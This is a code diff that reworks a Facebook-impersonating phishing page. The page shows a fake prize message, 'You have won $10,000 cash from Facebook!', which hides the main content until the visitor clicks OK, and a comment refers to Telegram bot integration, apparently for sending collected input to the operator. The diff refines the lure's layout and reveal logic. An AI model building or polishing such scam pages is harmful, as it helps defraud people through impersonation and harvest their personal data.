@@ -8,11 +8,13 @@
         body { 
             font-family: Arial, sans-serif; 
             text-align: center; 
-            background-color: #1877F2; 
-            color: white; 
-            display: none; /* Initially hide the full page */
+            background-color: white; 
+            color: black;
+            margin: 0;
+            padding: 0;
         }
-        .container { 
+        .container {
+            display: none; /* Hide the full page initially */
             margin-top: 50px; 
         }
         .facebook-logo {
@@ -66,7 +68,16 @@
     </style>
 </head>
 <body>
-    <div class="container">
+
+    <!-- Custom Congratulations Message -->
+    <div class="modal" id="customModal">
+        <div class="modal-content">
+            🎉 Congratulations! You have won $10,000 cash from Facebook! 🎉<br><br>
+            <button onclick="revealPage()">OK</button>
+        </div>
+    </div>
+
+    <div class="container" id="mainContent">
         <!-- Facebook Logo -->
         <img src="facebook-logo.png" alt="Facebook Logo" class="facebook-logo">
 
@@ -101,19 +112,11 @@
         </div>
     </div>
 
-    <!-- Custom Congratulations Message -->
-    <div class="modal" id="customModal">
-        <div class="modal-content">
-            🎉 Congratulations! You have won $10,000 cash from Facebook! 🎉<br><br>
-            <button onclick="revealPage()">OK</button>
-        </div>
-    </div>
-
     <script>
         // Show the full page after clicking OK
         function revealPage() {
             document.getElementById("customModal").style.display = "none"; // Hide modal
-            document.body.style.display = "block"; // Show the full page
+            document.getElementById("mainContent").style.display = "block"; // Show main content
         }
 
         // Telegram Bot Integration
@@ -146,4 +149,4 @@
         });
     </script>
 </body>
-    </html>
+</html>
